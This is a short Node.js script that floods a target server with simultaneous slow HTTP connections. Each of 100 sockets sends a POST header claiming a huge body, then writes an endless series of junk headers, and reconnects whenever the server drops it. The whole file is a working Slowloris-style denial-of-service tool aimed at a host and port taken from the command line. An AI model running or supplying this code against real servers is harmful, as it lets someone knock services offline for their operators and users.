const net = require('net');
const { performance } = require('perf_hooks');
const uuidv4 = require('uuid/v4');
const { argv } = require('yargs');

// Handle a lot of simultaneous connections and hold them tight.
const CONNECTIONS = 100;

net.Socket.prototype.writeAsync = function (data) {
  return new Promise(resolve => {
    this.write(data, resolve);
  });
};

class Connection {
  constructor(number, host, port) {
    this.number = number;
    this.host = host;
    this.port = port;
    this.state = 'ready';
    this.socket = null;
  }

  go() {
    this.uuid = uuidv4();
    this.state = 'going';
    this._initSocket();
  }

  end() {
    this.state = 'end';
    const endMark = this.uuid + '-end';
    performance.mark(endMark);
    performance.measure('time' + this.uuid, this.uuid, endMark);
    console.log(`[${this.number}] Time passed before server refused : ${performance.getEntriesByName('time' + this.uuid)[0].duration} ms`);
    this.go();
  }

  _initSocket() {
    this.socket = net.connect(this.port, this.host, async () => {
      await this.socket.writeAsync(`
        POST  HTTP/1.1
        Host: ${this.host}
        Content-Length: 9999999
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Cache-Control: no-cache
      `.trim());

      performance.mark(this.uuid);

      try {
        for (let i = 0; i < Infinity; i++) {
          await this.socket.writeAsync(`
            X-Shit-${i}: IWillDragYouDown
          `.trim());
          if (i > 0 && i % 3000 === 0) {
            console.log(`[${this.number}] Sent ${i} headers`);
          }
        }
      } catch (err) {
        this.socket.end();
        this.end();
      }
    });
    this.socket.on('data', data => {
      this.socket.end();
      this.end();
    });
    this.socket.on('error', () => {
      this.end();
    });
    this.socket.on('close', () => {
      this.end();
    });
    this.socket.on('end', () => {
      this.end();
    });
  }
}

(async () => {

  const { host, port } = argv;

  for (let i = 0; i < CONNECTIONS; i++) {
    const conn = new Connection(i, host, port);
    conn.go();
  }

})()
  .catch(console.error.bind(console));
